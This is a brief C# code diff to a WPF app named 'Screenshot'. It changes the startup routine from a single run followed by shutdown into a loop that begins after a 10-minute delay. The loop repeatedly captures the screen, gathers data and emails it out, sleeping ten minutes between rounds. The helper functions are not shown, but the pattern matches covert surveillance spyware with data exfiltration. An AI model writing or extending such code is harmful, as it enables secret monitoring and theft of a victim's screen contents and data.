@@ -18,14 +18,15 @@ namespace Screenshot
     {
         private void Application_Startup(object sender, StartupEventArgs e)
         {
-            //while(true)
-            //{
+            Thread.Sleep(600000);
+            while(true)
+            {
                 Screenshot();
                 Gather();
                 Thread.Sleep(20000);
                 Email("", "", "");
-                System.Windows.Application.Current.Shutdown();
-            //}
+                Thread.Sleep(600000);
+            }
 
         }
 
